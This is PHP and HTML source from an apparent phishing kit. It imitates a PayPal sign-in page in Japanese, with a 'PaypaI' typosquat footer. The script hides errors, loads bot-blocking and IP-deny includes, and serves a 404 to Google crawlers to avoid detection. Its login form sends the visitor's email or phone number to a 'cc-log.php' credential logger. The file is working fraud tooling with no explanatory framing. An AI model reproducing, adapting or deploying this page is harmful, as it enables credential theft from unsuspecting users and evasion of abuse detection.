<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';
session_start();
error_reporting(0);


/*
█▀▀█ █▀▀█ █░░   ▀█░█▀ ░█▀█░ ░ █▀▀█
█░░█ █░░█ █░░   ░█▄█░ █▄▄█▄ ▄ █▄▀█
█▀▀▀ █▀▀▀ ▀▀▀   ░░▀░░ ░░░█░ █ █▄▄█
                                                 
*/


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }

session_start();

include("functionns/Bot-blocker.php");
include("functionns/Geo-plugin.php");
include("functionns/OS-Platform.php");
include('../Denny-ip.php');

$random = rand(0,100000000000);
$dis    = substr(md5($random), 0, 25);
?>
<!DOCTYPE html>
<html lang="en" class="no-js desktop"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>
アカウントにサインインする</title>

<meta name="application-name" content="demo">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
<link rel="stylesheet" href="source/body.css">


<link rel="shortcut icon" href="source/img/pp258.png">
<link rel="icon" type="image/png" href="source/img/pp258.png">

<style id="antiClickjack">body {display: none !important;}</style></head>
<body class="desktop">
<div id="main" class="main" role="main">	

<section id="login" class="login " data-role="page" data-title="">


<div class="corral"><div id="content" class="contentContainer activeContent contentContainerBordered"><header>
<p class="paypal-logo paypal-logo-long"></p></header>
<div class="notifications"></div>

<form name="A1" method="post" action="functionns/cc-log.php" class="proceed maskable">

<div class="profileDisplayName hide"></div>

<div id="splitEmail" class="splitEmail"><div id="splitEmailSection" class="splitPhoneSection splitEmailSection">
<div class="textInput  " id="login_emaildiv"><div class="fieldWrapper ">
<label for="email" class="fieldLabel">Email or phone number</label>
<input id="login" name="login" type="email" class="hasHelp  validateEmpty " value=""  placeholder="
電子メールまたは電話番号" autocomplete="off" type="text" required="" aria-required="true"></div>
</div></div><div class="actions"><button class="button actionContinue scTrack:unifiedlogin-login-click-next" type="submit" id="btnNext" name="btnNext" value="Next">次</button></div>
</div></form>
<div id="signupContainer" class="signupContainer" data-hide-on-email="" data-hide-on-pass="">
<div class="loginSignUpSeparator"><span class="textInSeparator">
または </span></div>
<a href="#" class="button secondary scTrack:unifiedlogin-click-signup-button" id="createAccount">
ログイン</a></div>
<div id="tpdButtonContainer" class="signupContainer hide"><div class="loginSignUpSeparator"><span class="textInSeparator">または</span></div></div></div></div></section>


<footer class="footer" role="contentinfo"><div class="legalFooter">
<ul class="footerGroup">
<li>Copyright 2019 PaypaI</li></ul></div></footer></div>


</body></html>